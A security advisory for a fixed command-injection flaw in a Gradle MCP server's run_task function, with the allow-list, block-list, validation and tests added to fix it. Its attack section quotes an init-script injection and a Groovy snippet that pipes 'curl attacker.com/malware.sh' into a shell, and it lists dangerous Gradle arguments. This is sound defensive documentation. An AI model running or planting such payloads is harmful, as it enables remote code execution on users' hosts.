# Security Fix: Command Injection Vulnerability (CVE-2025-XXXX)

## Vulnerability Summary

**Severity**: Critical  
**Type**: Command Injection / Remote Code Execution (RCE)  
**Status**: ✅ Fixed

## Description

The `run_task` function in `gradle.py` was vulnerable to command injection through arbitrary argument injection. The function accepted an optional `args` parameter that was directly appended to the Gradle command without validation or sanitization. This allowed attackers to inject dangerous arguments like `--init-script` or `-I` to execute arbitrary Groovy/Kotlin code.

## Impact

- **Remote Code Execution (RCE)** on the machine running the Gradle MCP server
- Ability to read/modify any file accessible to the server process
- Data exfiltration
- Malware installation
- Complete host system takeover

## Attack Vectors

### Primary Attack: Init Script Injection
```python
# Attacker could execute arbitrary code via:
run_task("build", args=["--init-script", "/path/to/malicious.gradle"])
run_task("build", args=["-I", "/path/to/malicious.gradle"])
```

The malicious Gradle script could contain:
```groovy
// malicious.gradle
exec {
    commandLine 'sh', '-c', 'curl attacker.com/malware.sh | sh'
}
```

### Other Attack Vectors
- `-P` / `--project-prop`: Property injection
- `-D` / `--system-prop`: System property manipulation
- `-b` / `--build-file`: Execute arbitrary build files
- `-c` / `--settings-file`: Load malicious settings
- `-g` / `--gradle-user-home`: Access arbitrary directories
- `-p` / `--project-dir`: Execute code from different projects
- `--include-build`: Include malicious builds

## Solution Implemented

### 1. Argument Allow-List
Created a comprehensive allow-list of safe Gradle arguments:

```python
SAFE_GRADLE_ARGS = {
    # Logging options
    '--debug', '-d', '--info', '-i', '--warn', '-w', '--quiet', '-q',
    '--stacktrace', '-s', '--full-stacktrace', '-S',
    '--scan', '--no-scan',
    
    # Performance options
    '--build-cache', '--no-build-cache',
    '--configure-on-demand', '--no-configure-on-demand',
    '--max-workers', '--parallel', '--no-parallel',
    
    # Execution options
    '--continue', '--dry-run', '-m',
    '--refresh-dependencies', '--rerun-tasks', '--profile',
    
    # Task exclusion (safe as it only limits what runs)
    '-x', '--exclude-task',
    
    # Daemon options
    '--daemon', '--no-daemon', '--foreground', '--stop', '--status',
}
```

### 2. Dangerous Argument Block-List
Explicitly blocked all dangerous arguments:

```python
DANGEROUS_GRADLE_ARGS = {
    '--init-script', '-I',      # Can execute arbitrary code
    '--project-prop', '-P',      # Can inject properties
    '--system-prop', '-D',       # Can set system properties
    '--settings-file', '-c',     # Can load arbitrary settings
    '--build-file', '-b',        # Can load arbitrary build files
    '--gradle-user-home', '-g',  # Can access arbitrary directories
    '--project-dir', '-p',       # Can access arbitrary directories
    '--include-build',           # Can include arbitrary builds
}
```

### 3. Validation Function
Implemented `_validate_gradle_args()` that:
- Checks each argument against the dangerous list
- Validates arguments against the safe allow-list
- Handles both `--arg value` and `--arg=value` syntax
- Handles short form arguments like `-Pkey=value` and `-Dprop=value`
- Rejects unknown arguments by default (fail-safe approach)

### 4. Integration
Added validation call in `run_task()` before command execution:

```python
async def run_task(self, task: str, args: Optional[list[str]] = None, ...):
    # ... existing checks ...
    
    # Validate arguments to prevent command injection
    if args:
        self._validate_gradle_args(args)
    
    # ... continue with safe execution ...
```

## Code Changes

### Files Modified
1. `src/gradle_mcp/gradle.py`:
   - Added `SAFE_GRADLE_ARGS` class constant (lines 43-79)
   - Added `DANGEROUS_GRADLE_ARGS` class constant (lines 81-91)
   - Added `_validate_gradle_args()` method (lines 139-197)
   - Updated `run_task()` to call validation (line 434-436)

2. `src/gradle_mcp/server.py`:
   - Updated `run_task` docstring to document security restrictions (lines 130-152)

### Files Created
1. `tests/test_security.py`:
   - Comprehensive security test suite with 17 tests
   - Tests for all dangerous argument patterns
   - Tests for safe argument allowance
   - Tests for command injection prevention

## Testing

All 26 tests pass (9 existing + 17 new security tests):

```bash
uv run pytest tests/ -v
```

### Test Coverage
✅ Safe arguments are allowed  
✅ `--init-script` / `-I` blocked  
✅ `-P` / `--project-prop` blocked  
✅ `-D` / `--system-prop` blocked  
✅ `-b` / `--build-file` blocked  
✅ `-c` / `--settings-file` blocked  
✅ `-g` / `--gradle-user-home` blocked  
✅ `-p` / `--project-dir` blocked  
✅ `--include-build` blocked  
✅ Unknown arguments blocked  
✅ Mixed safe arguments work  
✅ Dangerous args blocked even when mixed with safe ones  

## Backward Compatibility

The fix maintains backward compatibility for legitimate use cases:
- All safe, common Gradle arguments continue to work
- Examples from documentation still work: `['-x', 'test']`, `['--info']`, `['--parallel']`
- Only dangerous arguments that could enable attacks are blocked

## Recommendations

1. **Upgrade Immediately**: All users should upgrade to this patched version
2. **Review Logs**: Check logs for any suspicious argument usage patterns
3. **Defense in Depth**: Consider additional security measures:
   - Run the MCP server with minimal privileges
   - Use container isolation (Docker, etc.)
   - Implement network-level access controls
   - Monitor for unusual Gradle activity

## Security Best Practices

This fix follows security best practices:
- ✅ **Allow-list approach**: Only explicitly safe arguments are permitted
- ✅ **Defense in depth**: Multiple validation checks
- ✅ **Fail-safe defaults**: Unknown arguments are rejected
- ✅ **Comprehensive testing**: 17 security-focused tests
- ✅ **Clear documentation**: Updated docstrings and error messages

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Gradle Command-Line Interface](https://docs.gradle.org/current/userguide/command_line_interface.html)

---

**Fix Date**: November 6, 2025  
**Fixed in Version**: 0.1.1 (pending release)  
**Reported by**: Security Audit  
